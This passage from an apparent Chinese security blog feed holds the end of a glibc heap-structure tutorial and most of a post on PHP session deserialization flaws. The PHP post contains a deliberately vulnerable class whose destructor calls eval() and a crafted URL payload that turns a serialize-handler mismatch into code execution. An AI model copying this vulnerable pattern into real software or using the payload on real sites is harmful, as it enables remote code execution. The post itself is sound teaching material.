src="/2019/04/27/堆基础/6.png" alt=""></p><p><strong>mmap 后</strong></p><p>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了7f2a92624000到7f2a92645000的mmap段：</p><p><img src="/2019/04/27/堆基础/7.png" alt=""></p><p><strong>munmap</strong></p><p>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了：</p><p><img src="/2019/04/27/堆基础/8.png" alt=""></p><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><blockquote><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p></blockquote><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After free in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to per thread arena example::%d\n"</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After free in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Thread creation error\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Thread join error\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意在gcc编译时加上-lpthread参数，否则会编译出错，因为pthread不是Linux下的默认的库，也就是在链接的时候，无法找到phread库中函数的入口地址，于是链接会失败。</p><p><strong>第一次申请之前</strong></p><p>没有heap段。</p><p><img src="/2019/04/27/堆基础/9.png" alt=""></p><p><strong>第一次申请后</strong></p><p>heap段被建立了，并且它就紧邻着数据段，这说明malloc的背后是用brk()函数来实现的。同时需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了|0x01291000-0x012b2000|=0x21000 个字节的堆。<strong>这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直从这个arena 中获取，直到空间不足。当arena空间不足时，它可以通过增加brk的方式来增加堆的空间。类似地，arena也可以通过减小brk来缩小自己的空间。</p><p><img src="/2019/04/27/堆基础/10.png" alt=""></p><p><strong>在主线程释放内存后</strong></p><p>对应的arena并没有进行回收，而是交由glibc来进行管理。当后面程序再次申请内存时，在glibc中管理的内存充足的情况下，glibc就会根据堆分配的算法来给程序分配相应的内存。</p><p><img src="/2019/04/27/堆基础/11.png" alt=""></p><p><strong>在第一个线程 malloc 之前</strong></p><p>可以看到并没有出现与线程1相关的堆，但是出现了与线程1相关的栈。</p><p><img src="/2019/04/27/堆基础/12.png" alt=""></p><p><strong>第一个线程 malloc 后</strong></p><p>可以看出线程1的堆段被建立了，而且它所在的位置为内存映射段区域，同样大小也是132KB(7fd1a0000000-7fd1a0021000)。因此这表明该线程申请的堆时，背后对应的函数为mmap函数。同时可以看出实际真的分配给程序的内存为64M(7fd1a0000000-7fd1a4000000)，而且只有132KB的部分具有可读可写权限，这一块连续的区域成为thread arena。</p><p>注意：</p><blockquote><p>当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p></blockquote><p><img src="/2019/04/27/堆基础/13.png" alt=""></p><p><strong>在第一个线程释放内存后</strong></p><p>可以看到，这样释放内存同样不会把内存重新给系统。</p><p><img src="/2019/04/27/堆基础/14.png" alt=""></p><h2 id="0x03-堆相关数据结构"><a href="#0x03-堆相关数据结构" class="headerlink" title="0x03 堆相关数据结构"></a>0x03 堆相关数据结构</h2><p>与堆相关的数据结构主要分为</p><ul><li>宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。</li><li>微观结构，用于具体处理堆的分配与回收中的内存块。</li></ul><h3 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><p><strong>概述 </strong></p><p>在程序的执行过程中，称由malloc()申请的内存为chunk。这块内存在ptmalloc内部用malloc_chunk结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p><strong>无论一个chunk的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但根据是否被释放，它们的表现形式会有所不同。</p><p>malloc_chunk的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先，这里给出一些必要的解释 INTERNAL_SIZE_T，SIZE_SZ，MALLOC_ALIGN_MASK：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure><p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p><p>每个字段的具体的解释如下：</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</li><li><strong>size</strong>，该 chunk 的大小，大小必须是 2 <em> SIZE_SZ 的整数倍。如果申请的内存大小不是 2 </em> SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p>一个已经分配的 chunk 的样子如下。<strong>我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong></p><p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&apos; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&apos; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p><ol><li>本身的 size 字段会记录，</li><li>它后面的 chunk 会记录。</li></ol><p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p><p><strong>！！！一些关于堆的约束，后面详细考虑！！！</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    The three exceptions to all this are:</span><br><span class="line">     1. The special chunk `top&apos; doesn&apos;t bother using the</span><br><span class="line">    trailing size field since there is no next contiguous chunk</span><br><span class="line">    that would have to index off it. After initialization, `top&apos;</span><br><span class="line">    is forced to always exist.  If it would become less than</span><br><span class="line">    MINSIZE bytes long, it is replenished.</span><br><span class="line">     2. Chunks allocated via mmap, which have the second-lowest-order</span><br><span class="line">    bit M (IS_MMAPPED) set in their size fields.  Because they are</span><br><span class="line">    allocated one-by-one, each must contain its own trailing size</span><br><span class="line">    field.  If the M bit is set, the other bits are ignored</span><br><span class="line">    (because mmapped chunks are neither in an arena, nor adjacent</span><br><span class="line">    to a freed chunk).  The M bit is also used for chunks which</span><br><span class="line">    originally came from a dumped heap via malloc_set_state in</span><br><span class="line">    hooks.c.</span><br><span class="line">     3. Chunks in fastbins are treated as allocated chunks from the</span><br><span class="line">    point of view of the chunk allocator.  They are consolidated</span><br><span class="line">    with their neighbors only in bulk, in malloc_consolidate.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>…</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview/" target="_blank" rel="noopener">堆概述</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/" target="_blank" rel="noopener">堆相关数据结构</a></p>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="二进制基础" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="堆溢出" scheme="https://Mi1k7ea.github.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>PHP session反序列化漏洞</title>
    <link href="https://Mi1k7ea.github.com/2019/04/21/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://Mi1k7ea.github.com/2019/04/21/PHP-session反序列化漏洞/</id>
    <published>2019-04-21T12:20:37.000Z</published>
    <updated>2019-05-28T14:17:38.766Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-PHP-session序列化机制"><a href="#0x01-PHP-session序列化机制" class="headerlink" title="0x01 PHP session序列化机制"></a>0x01 PHP session序列化机制</h2><p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。</p><h3 id="session序列化及反序列化处理器"><a href="#session序列化及反序列化处理器" class="headerlink" title="session序列化及反序列化处理器"></a>session序列化及反序列化处理器</h3><p>PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p><table><thead><tr><th>处理器</th><th>对应的存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td></tr><tr><td>php_serialize  (php&gt;=5.5.4)</td><td>经过 serialize() 函数反序列处理的数组</td></tr></tbody></table><h3 id="与session存储相关的配置项"><a href="#与session存储相关的配置项" class="headerlink" title="与session存储相关的配置项"></a>与session存储相关的配置项</h3><p>配置文件php.ini中含有这几个与session存储相关的配置项：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.save_path ="E:/wamp64/tmp"   --设置session的存储路径,默认在/tmp</span><br><span class="line">session.auto_start = 0   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler = php   --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure><p>PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器，默认为php。如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’)，如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">// do something</span></span><br></pre></td></tr></table></figure><h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p><p>存储的文件是以<code>sess_sessionid</code>来进行命名的，文件的内容就是session值的序列话之后的内容。</p><p>下面用个简单的Demo看看存储的形式：</p><p>example.php，这时是使用默认的处理器即PHP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'m7'</span>] = $_GET[<span class="string">'m7'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可在session.save_path对应路径下看到一个新生成的session文件，这里名为sess_cj15cikdujk6uv3bdq6qvonbe7，可以看到存储格式为：键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</p><p><img src="/2019/04/21/PHP-session反序列化漏洞/1.png" alt=""></p><p>添加一行代码修改处理器为php_serialize：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'m7'</span>] = $_GET[<span class="string">'m7'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>格式：经过serialize()函数反序列处理的数组</p><p><img src="/2019/04/21/PHP-session反序列化漏洞/2.png" alt=""></p><p>修改处理器为php_binary：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_binary'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'m7'</span>] = $_GET[<span class="string">'m7'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到：键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</p><p><img src="/2019/04/21/PHP-session反序列化漏洞/3.png" alt=""></p><h2 id="0x02-PHP-session反序列化漏洞"><a href="#0x02-PHP-session反序列化漏洞" class="headerlink" title="0x02 PHP session反序列化漏洞"></a>0x02 PHP session反序列化漏洞</h2><p>PHP session反序列化漏洞，简单点说，就是当网站序列化并存储Session与反序列化并读取Session的方式不同时就可能导致session反序列化漏洞的产生。</p><h3 id="漏洞Demo"><a href="#漏洞Demo" class="headerlink" title="漏洞Demo"></a>漏洞Demo</h3><p>save.php，和前面的demo一样，这里用的是php_serialize处理器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'m7'</span>] = $_GET[<span class="string">'m7'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>session_vul.php，这里用的是默认的php处理器，可以不添加该行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mi1k7ea</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// function __destruct()&#123;</span></span><br><span class="line">    <span class="comment">//  system($this-&gt;a);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// function __sleep()&#123;</span></span><br><span class="line"><span class="comment">// eval($this-&gt;a);</span></span><br><span class="line"><span class="comment">// return array('a');</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">// eval($this-&gt;a);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问包含恶意构造序列化对象的URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save.php?m7=|O:7:&quot;mi1k7ea&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure><p>打开session文件可看到序列化存储的内容，再访问session_vul.php即可看到php代码被执行了：</p><p><img src="/2019/04/21/PHP-session反序列化漏洞/4.png" alt=""></p><p>这是因为php引擎会以|作为key和value的分隔符，将a:1:{s:2:”m7”;s:45:”作为SESSION的key，将O:7:”mi1k7ea”:1:{s:1:”a”;s:10:”phpinfo();”;}作为value，然后进行反序列化，就会实例化mi1k7ea对象，最后就会执行__destruct()函数中的eval()方法，相当于执行如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'m7'</span>] = <span class="keyword">new</span> mi1k7ea();</span><br><span class="line">$_SESSION[<span class="string">'m7'</span>]-&gt;a = <span class="string">'phpinfo();'</span>;</span><br></pre></td></tr></table></figure><h2 id="0x03-题目"><a 